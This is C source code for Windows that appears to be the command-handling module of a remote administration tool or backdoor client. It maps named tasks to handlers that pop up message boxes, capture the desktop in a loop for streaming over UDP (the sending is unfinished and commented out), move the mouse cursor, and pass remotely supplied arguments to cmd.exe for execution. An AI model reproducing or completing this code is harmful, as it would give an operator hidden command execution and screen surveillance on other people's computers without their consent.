#include "Commands.h"
#include "UDPClient.h"
#include "..\Debugger.h"

#include <tchar.h> // _tcscpy_s, _tcscmp

// #pragma comment("d3d9", lib)

VOID _on_task_MESSAGEBOX(CONST PVOID args, PTCHAR result)
{
	if (!MessageBoxEx(NULL, args, TEXT("ERROR"), MB_ICONERROR, MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL)))
		_tcscpy_s(result, RESULT_LENGTH, TASK_FAILUREP);
	else
		_tcscpy_s(result, RESULT_LENGTH, TASK_SUCCESSP);
}

VOID SendDesktopScreen(LPVOID socket)
{
	INT width  = GetSystemMetrics(SM_CXSCREEN),
	    height = GetSystemMetrics(SM_CYSCREEN);

	while (TRUE)
	{
		HDC desktopDC = GetDC(NULL);
		HDC captureDC = CreateCompatibleDC(desktopDC);
		HBITMAP bitmap = CreateCompatibleBitmap(desktopDC, width, height);

		SelectObject(captureDC, bitmap);
		BitBlt(captureDC, 0, 0, width, height, desktopDC, 0, 0, SRCCOPY | CAPTUREBLT);
		// SendBitmap(socket, bitmap);

		// GetDIBits(desktopDC, bitmap, 0, (WORD)pbih->biHeight, lpBits, pbi, DIB_RGB_COLORS);

		ReleaseDC(NULL, desktopDC);
		DeleteDC(captureDC);
		DeleteObject(bitmap);
	}
}

VOID _on_task_VIEWDESKTOP(CONST PVOID args, PTCHAR result)
{
	static HANDLE hThread = NULL;
	static SOCKET socket  = INVALID_SOCKET;

	int x = 0;
	if (_stscanf_s(args, TEXT("%d"), &x) == 0) // No args == start or work if started
	{
		if (!hThread)
		{
			socket = INVALID_SOCKET; // InitUDPClient();
			if (socket == INVALID_SOCKET)
			{
				_tcscpy_s(result, RESULT_LENGTH, TASK_FAILUREP);

				return;
			}

			hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&SendDesktopScreen, &socket, 0, NULL);
			if(!hThread)
				_tcscpy_s(result, RESULT_LENGTH, TASK_FAILUREP);
			else
				_tcscpy_s(result, RESULT_LENGTH, TASK_SUCCESSP);
		}
		else
			_tcscpy_s(result, RESULT_LENGTH, TASK_SUCCESSP);
	}
	else
	{
		if(!CloseHandle(hThread))
			_tcscpy_s(result, RESULT_LENGTH, TASK_FAILUREP);
		else
			_tcscpy_s(result, RESULT_LENGTH, TASK_SUCCESSP);

		closesocket(socket);
	}
}

VOID _on_task_MOUSECTRL(CONST PVOID args, PTCHAR result)
{
	INT x = 0,
		y = 0;

	if (_stscanf_s(args, TEXT("%d %d"), &x, &y) != 2)
	{
		$error _tprintf(TEXT("Failed to get mouse coords"));

		_tcscpy_s(result, RESULT_LENGTH, TASK_FAILUREP);

		return;
	}

	if(!SetCursorPos(x, y))
		_tcscpy_s(result, RESULT_LENGTH, TASK_FAILUREP);
	else
		_tcscpy_s(result, RESULT_LENGTH, TASK_SUCCESSP);
}

VOID _on_task_EXECUTECMD(CONST PVOID args, PTCHAR result)
{
	SHELLEXECUTEINFO shell = { sizeof(SHELLEXECUTEINFO) };
	shell.fMask            = SEE_MASK_DEFAULT;
	shell.lpVerb           = TEXT("open"); // Yep, i know that it ia a default value
	shell.lpFile           = TEXT("cmd.exe");
	shell.lpParameters     = args;
	shell.nShow            = SW_SHOW;
	if (!ShellExecuteEx(&shell))
		_tcscpy_s(result, RESULT_LENGTH, TASK_FAILUREP);
	else
		_tcscpy_s(result, RESULT_LENGTH, TASK_SUCCESSP);
}

INT cmd2code(CONST PTCHAR cmd)
{
	for (size_t i = 0ul; i < NUMBER_OF_COMMANDS; ++i)
		if (_tcscmp(MAP_COMMANDS[i].pair.name, cmd) == 0)
			return MAP_COMMANDS[i].pair.code;
	
	return UNDEFINEDCMD;
}

CONST PTCHAR code2cmd(INT code)
{ 
	for (size_t i = 0ul; i < NUMBER_OF_COMMANDS; ++i)
		if (MAP_COMMANDS[i].pair.code == code)
			return MAP_COMMANDS[i].pair.name;

	return UNDEFINEDP;
}